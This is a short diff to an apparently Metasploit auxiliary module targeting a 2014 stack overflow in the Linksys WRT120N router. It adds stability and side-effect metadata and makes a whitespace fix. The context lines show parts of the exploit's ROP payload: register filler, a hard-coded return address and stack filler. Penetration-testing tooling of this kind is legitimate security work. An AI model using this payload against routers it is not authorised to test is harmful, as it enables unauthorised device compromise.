@@ -27,7 +27,12 @@ class MetasploitModule < Msf::Auxiliary
           [ 'OSVDB', '103521' ],
           [ 'URL', 'https://web.archive.org/web/20210424073058/http://www.devttys0.com/2014/02/wrt120n-fprintf-stack-overflow/' ] # a huge amount of details about this vulnerability and the original exploit
         ],
-        'DisclosureDate' => '2014-02-19'
+        'DisclosureDate' => '2014-02-19',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES],
+          'Reliability' => []
+        }
       )
     )
   end
@@ -76,7 +81,7 @@ class MetasploitModule < Msf::Auxiliary
       postdata << Rex::Text.rand_text_alpha(4)            # ROP 2 $s0, don't care
       postdata << Rex::Text.rand_text_alpha(4)            # ROP 2 $s1, don't care
       postdata << [0x803471b8].pack('N')                  # ROP 2 $ra (address of itself)
-      postdata << Rex::Text.rand_text_alpha(4 - (3 * (i / 3)))  # Stack filler
+      postdata << Rex::Text.rand_text_alpha(4 - (3 * (i / 3))) # Stack filler
     end
 
     begin
